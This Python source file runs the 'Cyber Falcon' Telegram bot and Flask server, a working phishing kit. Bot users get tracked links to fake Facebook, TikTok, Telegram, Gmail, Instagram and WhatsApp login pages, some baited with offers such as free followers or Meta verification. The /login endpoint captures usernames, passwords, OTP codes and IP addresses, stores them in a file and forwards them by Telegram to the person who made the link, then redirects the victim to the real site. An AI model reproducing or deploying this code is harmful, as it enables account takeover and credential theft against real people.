import asyncio
import logging
import requests
import json
import os
import threading
import time
import re
from datetime import datetime
from flask import Flask, send_from_directory, request, redirect, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============= কনফিগারেশন =============
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', 7843284032))
RENDER_URL = os.environ.get('RENDER_URL', "https://fc-bot-vz4u.onrender.com")

if not TELEGRAM_BOT_TOKEN:
    print("ERROR: TELEGRAM_BOT_TOKEN not set!")
    exit(1)

# ============= ফ্লাস্ক অ্যাপ =============
flask_app = Flask(__name__)

# ============= হেল্পার ফাংশন =============
def get_device_info(user_agent):
    """ডিভাইস তথ্য (অপশনাল - এখন ব্যবহার করব না)"""
    return ""  # ফাকা রিটার্ন করব, ডিভাইস দেখাব না

def format_message(data):
    """সুন্দর ফরম্যাটেড মেসেজ তৈরি করে"""
    page_type = data.get('pageType', 'unknown')
    username = data.get('username', 'N/A')
    password = data.get('password', 'N/A')
    ip = data.get('ipAddress', 'N/A')
    timestamp = data.get('timestamp', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    
    # প্ল্যাটফর্ম নাম নির্ধারণ
    platform_names = {
        'facebook': 'Facebook',
        'facebook_followers': 'Facebook Followers',
        'tiktok': 'TikTok',
        'tiktok_boost': 'TikTok Booster',
        'telegram': 'Telegram',
        'gmail': 'Gmail',
        'instagram': 'Instagram',
        'meta_verify': 'Meta Verified',
        'Whatsapp_groups': 'WhatsApp',
        'whatsapp_groups': 'WhatsApp',
        'whatsapp_groups_otp': 'WhatsApp OTP',
        'whatsapp_groups_resend': 'WhatsApp Resend'
    }
    
    platform = platform_names.get(page_type, page_type.replace('_', ' ').title())
    
    # OTP চেক
    otp_code = data.get('otp_code', '')
    group_name = data.get('groupName', '')
    
    # আইকন
    icon = "🔐"
    if 'tiktok' in page_type:
        icon = "🎵"
    elif 'facebook' in page_type:
        icon = "📘"
    elif 'instagram' in page_type:
        icon = "📷"
    elif 'whatsapp' in page_type.lower():
        icon = "💚"
    elif 'telegram' in page_type:
        icon = "✈️"
    elif 'gmail' in page_type:
        icon = "📧"
    elif 'meta' in page_type:
        icon = "💎"
    
    if otp_code and otp_code != 'N/A':
        # OTP মেসেজ ফরম্যাট
        message = f"""
{icon}🦅 *OTP RECEIVED* 🦅{icon}

📱 *Platform:* {platform}
🔢 *OTP Code:* `{otp_code}`
👥 *Group:* {group_name if group_name else 'N/A'}
🌐 *IP:* `{ip}`
⏰ *Time:* {timestamp}
        """
    else:
        # লগইন মেসেজ ফরম্যাট
        message = f"""
{icon}🦅 *NEW LOGIN ALERT* 🦅{icon}

📱 *Platform:* {platform}
👤 *ID:* `{username}`
🔑 *Pass:* `{password}`
🌐 *IP:* `{ip}`
⏰ *Time:* {timestamp}
        """
    
    return message

@flask_app.route('/')
def index():
    return "🦅 Cyber Falcon Bot is Running!", 200

@flask_app.route('/health')
def health():
    return "OK", 200

# লগইন পেজগুলো সরাসরি serve করার জন্য
@flask_app.route('/facebook')
def facebook_page():
    return send_from_directory('templates', 'facebook.html')

@flask_app.route('/tiktok')
def tiktok_page():
    return send_from_directory('templates', 'tiktok.html')

@flask_app.route('/telegram')
def telegram_page():
    return send_from_directory('templates', 'telegram.html')

@flask_app.route('/gmail')
def gmail_page():
    return send_from_directory('templates', 'gmail.html')

@flask_app.route('/instagram')
def instagram_page():
    return send_from_directory('templates', 'instagram.html')

@flask_app.route('/facebook_followers')
def facebook_followers_page():
    return send_from_directory('templates', 'facebook_followers.html')

@flask_app.route('/Whatsapp_groups')
def whatsapp_groups_page():
    return send_from_directory('templates', 'Whatsapp_groups.html')

@flask_app.route('/tiktok_boost')
def tiktok_boost_page():
    return send_from_directory('templates', 'tiktok_boost.html')

@flask_app.route('/meta_verify')
def meta_verify_page():
    return send_from_directory('templates', 'meta_verify.html')

@flask_app.route('/login', methods=['POST'])
def handle_login():
    """সব লগইন ডাটা এখানে আসে"""
    
    # ফর্ম ডাটা সংগ্রহ
    username = request.form.get('username') or request.form.get('email') or 'N/A'
    password = request.form.get('password') or 'N/A'
    groupName = request.form.get('groupName') or 'N/A'
    otp_code = request.form.get('otp_code') or request.form.get('otpCode') or 'N/A'
    
    # URL থেকে প্যারামিটার নিন
    page_type = request.args.get('page_type', 'unknown')
    target_user_id = request.args.get('user_id', 'unknown')
    
    # যদি user_id না আসে, তাহলে রেফারার থেকে বের করার চেষ্টা
    if target_user_id == 'unknown' or target_user_id == 'None':
        referer = request.headers.get('Referer', '')
        if 'user_id=' in referer:
            match = re.search(r'user_id=(\d+)', referer)
            if match:
                target_user_id = match.group(1)
    
    print(f"📥 LOGIN - Platform: {page_type}, User: {username}, Target: {target_user_id}")
    
    # JSON ডাটা তৈরি
    data = {
        'username': username,
        'password': password,
        'groupName': groupName,
        'otp_code': otp_code,
        'ipAddress': request.remote_addr,
        'pageType': page_type,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'generated_by': target_user_id,
        'userAgent': request.headers.get('User-Agent', 'Unknown')
    }
    
    # credentials.json এ সেভ
    try:
        with open('credentials.json', 'a') as f:
            f.write(json.dumps(data) + '\n')
    except Exception as e:
        print(f"Error saving: {e}")
    
    # টেলিগ্রামে মেসেজ পাঠান
    if target_user_id != 'unknown' and target_user_id != 'None' and target_user_id != '':
        try:
            message = format_message(data)
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            response = requests.post(
                url, 
                json={
                    'chat_id': int(target_user_id), 
                    'text': message, 
                    'parse_mode': 'Markdown'
                }, 
                timeout=10
            )
            if response.status_code == 200:
                print(f"✅ Sent to user {target_user_id}")
        except Exception as e:
            print(f"❌ Failed: {e}")
    
    # রিডাইরেক্ট
    redirect_urls = {
        'facebook': 'https://www.facebook.com/',
        'facebook_followers': 'https://www.facebook.com/',
        'tiktok': 'https://www.tiktok.com/',
        'tiktok_boost': 'https://www.tiktok.com/',
        'telegram': 'https://web.telegram.org/',
        'gmail': 'https://mail.google.com/',
        'instagram': 'https://www.instagram.com/',
        'meta_verify': 'https://business.facebook.com/',
        'Whatsapp_groups': 'https://chat.whatsapp.com/',
        'whatsapp_groups': 'https://chat.whatsapp.com/'
    }
    
    redirect_url = redirect_urls.get(page_type, 'https://www.google.com')
    return redirect(redirect_url)

def run_flask():
    """ফ্লাস্ক সার্ভার চালায়"""
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host='0.0.0.0', port=port, threaded=True)

# ============= টেলিগ্রাম বট =============
active_users = set()
user_details = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্টার্ট কমান্ড হ্যান্ডলার - আপনার পছন্দের ফরম্যাটে"""
    query = update.callback_query
    if query:
        await query.answer()
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        user_name = query.from_user.first_name
        user_username = query.from_user.username
    else:
        chat_id = update.effective_chat.id
        message_id = None
        user_name = update.effective_user.first_name
        user_username = update.effective_user.username
    
    active_users.add(chat_id)
    if chat_id not in user_details:
        user_details[chat_id] = {
            'name': user_name,
            'username': user_username or 'N/A',
            'joined': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All Main Pages", callback_data="menu_main")],
        [InlineKeyboardButton("📢 Advance Pages", callback_data="menu_advance")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 Community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ])
    
    # আপনার পছন্দের ফরম্যাট
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
👥 *Total Users:* {len(active_users)}
Musk Bot: @MR_FireSword_2025_bot
    """
    
    if message_id:
        await context.bot.edit_message_text(
            chat_id=chat_id, 
            message_id=message_id, 
            text=message, 
            reply_markup=keyboard, 
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def menu_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """মেইন মেনু"""
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📘 Facebook", callback_data="page_facebook")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="page_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="page_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="page_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="page_instagram")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back")]
    ])
    
    await query.edit_message_text(
        "📱 *Select a Platform*\n\nChoose any platform to continue:",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """অ্যাডভান্স মেনু"""
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Free Followers", callback_data="adv_followers")],
        [InlineKeyboardButton("💚 Hot WhatsApp Groups", callback_data="adv_groups")],
        [InlineKeyboardButton("🚀 TikTok Booster", callback_data="adv_boost")],
        [InlineKeyboardButton("💎 Meta Verified", callback_data="adv_verify")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back")]
    ])
    
    await query.edit_message_text(
        "⚡ *Advance Features*\n\nSelect an option below:",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, url_path: str, back_callback: str, page_type: str):
    """পেজ দেখায় এবং লিংক জেনারেট করে"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.message.chat.id
    full_url = f"{RENDER_URL}/{url_path}?page_type={page_type}&user_id={user_id}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Page", url=full_url)],
        [InlineKeyboardButton("⬅️ Back", callback_data=back_callback)]
    ])
    
    await query.edit_message_text(
        f"🔗 *{title}*\n\nClick the button below to open:",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্ট্যাটাস দেখায়"""
    query = update.callback_query
    user_id = query.message.chat.id
    user_info = user_details.get(user_id, {'name': 'User', 'username': 'N/A', 'joined': 'Unknown'})
    
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back", callback_data="back")]
    ])
    
    message = f"""
📊 *BOT STATUS* 📊

🦅 *Status:* 🟢 Active
👤 *Name:* {user_info['name']}
🆔 *User ID:* `{user_id}`
📛 *Username:* @{user_info['username']}
📅 *Joined:* {user_info['joined']}
👥 *Total Users:* {len(active_users)}

🌐 *Bot Link:* @MR_FireSword_2025_bot
🥷 *Community:* @CyberFalcon
    """
    await query.edit_message_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ব্যাক বাটন"""
    await start(update, context)

# ============= অ্যাডমিন কমান্ড =============
async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ *Access Denied!*", parse_mode='Markdown')
        return
    
    if not user_details:
        await update.message.reply_text("📭 No users yet.")
        return
    
    message = "📋 *User List*\n\n"
    for uid, info in list(user_details.items())[:30]:
        message += f"👤 {info['name']}\n🆔 `{uid}`\n📛 @{info['username']}\n📅 {info['joined']}\n━━━━━━━━━\n"
    
    if len(user_details) > 30:
        message += f"\n... and {len(user_details) - 30} more"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def total_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Access Denied!", parse_mode='Markdown')
        return
    
    await update.message.reply_text(f"👥 *Total Users:* `{len(active_users)}`", parse_mode='Markdown')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Access Denied!", parse_mode='Markdown')
        return
    
    message_text = ' '.join(context.args)
    if not message_text:
        await update.message.reply_text("⚠️ Usage: `/broadcast your message`", parse_mode='Markdown')
        return
    
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(active_users)} users...")
    
    for chat_id in active_users:
        try:
            await context.bot.send_message(chat_id=chat_id, text=f"📢 *Announcement*\n\n{message_text}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit_text(f"✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode='Markdown')

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    print(f"📌 Callback: {data}")
    
    if data == "menu_main":
        await menu_main(update, context)
    elif data == "menu_advance":
        await menu_advance(update, context)
    elif data == "status":
        await status(update, context)
    elif data == "back":
        await back(update, context)
    elif data == "page_facebook":
        await show_page(update, context, "📘 Facebook Login", "facebook", "menu_main", "facebook")
    elif data == "page_tiktok":
        await show_page(update, context, "🎵 TikTok Login", "tiktok", "menu_main", "tiktok")
    elif data == "page_telegram":
        await show_page(update, context, "✈️ Telegram Login", "telegram", "menu_main", "telegram")
    elif data == "page_gmail":
        await show_page(update, context, "📧 Gmail Login", "gmail", "menu_main", "gmail")
    elif data == "page_instagram":
        await show_page(update, context, "📷 Instagram Login", "instagram", "menu_main", "instagram")
    elif data == "adv_followers":
        await show_page(update, context, "🎯 Free Facebook Followers", "facebook_followers", "menu_advance", "facebook_followers")
    elif data == "adv_groups":
        await show_page(update, context, "💚 Hot WhatsApp Groups", "Whatsapp_groups", "menu_advance", "Whatsapp_groups")
    elif data == "adv_boost":
        await show_page(update, context, "🚀 TikTok Booster", "tiktok_boost", "menu_advance", "tiktok_boost")
    elif data == "adv_verify":
        await show_page(update, context, "💎 Meta Verified", "meta_verify", "menu_advance", "meta_verify")
    else:
        await query.answer("Unknown option!", show_alert=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '/start':
        await start(update, context)
    else:
        await update.message.reply_text("Please use /start to see the menu")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ Error: {context.error}")

def run_bot():
    print("🦅 Starting Cyber Falcon Bot...")
    
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteWebhook")
        print("✅ Webhook deleted")
    except Exception as e:
        print(f"Webhook error: {e}")
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("link", start))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("total", total_users))
    app.add_handler(CommandHandler("users", show_users))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    print("🚀 Bot is running!")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(2)
    print("✅ Flask started on port 5000")
    run_bot()